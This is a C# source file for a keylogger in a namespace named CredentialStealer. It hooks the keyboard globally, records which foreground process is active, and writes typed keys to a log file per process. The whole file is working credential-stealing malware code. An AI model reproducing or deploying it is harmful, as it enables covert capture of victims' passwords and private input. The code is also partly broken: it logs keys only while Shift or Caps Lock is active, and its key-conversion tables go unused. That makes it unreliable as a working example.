using RamGecTools;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.IO;

namespace CredentialStealer.KeyboardRecorder
{
    class KeyLogger
    {
        private KeyboardHook keyboardHook;

        private StreamWriter sw;

        private int storedActivePid;

        private bool shiftOn;
        private bool capsOn;

        private Dictionary<KeyboardHook.VKeys, char> ConvertKeys = new Dictionary<KeyboardHook.VKeys, char>()
        {
            {KeyboardHook.VKeys.SPACE, ' '}
        };

        private List<KeyboardHook.VKeys> IgnoreKeys = new List<KeyboardHook.VKeys>(){ KeyboardHook.VKeys.CONTROL, KeyboardHook.VKeys.LCONTROL, KeyboardHook.VKeys.RCONTROL, KeyboardHook.VKeys.LSHIFT };

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        public KeyLogger(string pathToFile)
        {
            sw = new StreamWriter(pathToFile);

            keyboardHook = new KeyboardHook();
            keyboardHook.KeyDown += new RamGecTools.KeyboardHook.KeyboardHookCallback(KeyDown);
            keyboardHook.KeyUp += new RamGecTools.KeyboardHook.KeyboardHookCallback(KeyUp);
            keyboardHook.Install();
        }

        private static int GetActiveProcessId()
        {
            Process activeProcess = GetActiveProcess();
            return activeProcess != null ? activeProcess.Id : 0;
        }

        private static Process GetActiveProcess()
        {
            IntPtr hwnd = GetForegroundWindow();
            return hwnd != null ? GetProcessByHandle(hwnd) : null;
        }

        private static Process GetProcessByHandle(IntPtr hwnd)
        {
            try
            {
                uint processID;
                GetWindowThreadProcessId(hwnd, out processID);
                return Process.GetProcessById((int)processID);
            }
            catch { return null; }
        }

        private void KeyDown(KeyboardHook.VKeys key)
        {
            switch (key)
            {
                case KeyboardHook.VKeys.SHIFT:
                case KeyboardHook.VKeys.LSHIFT:
                case KeyboardHook.VKeys.RSHIFT:
                    shiftOn = true;
                    break;
                case KeyboardHook.VKeys.CAPITAL:
                    if (capsOn)
                    {
                        capsOn = false;
                    }
                    else
                    {
                        capsOn = true;
                    }
                    break;
                default:
                    break;
            }
        }

        private void KeyUp(RamGecTools.KeyboardHook.VKeys key)
        {
            //if saved active process is different from current active process,
            //start a new record of the log
            int activePid = GetActiveProcessId();
            if (activePid != storedActivePid)
            {
                storedActivePid = activePid;

                //end previous line, add new record to file
                sw.Write('\n');
                sw.Write(storedActivePid);
                sw.Write('\t');
                sw.Write(GetActiveProcess().ProcessName);
                sw.Write('\t');
            }
            //if saved active process is same as current active process,
            //continue writing to same line of log
            if (shiftOn && capsOn)
            {
                sw.Write(key.ToString().ToLower());
            }
            else if (shiftOn || capsOn)
            {
                sw.Write(key.ToString().ToUpper());
            }
            
            sw.Flush();
            shiftOn = false;
        }
    }
}
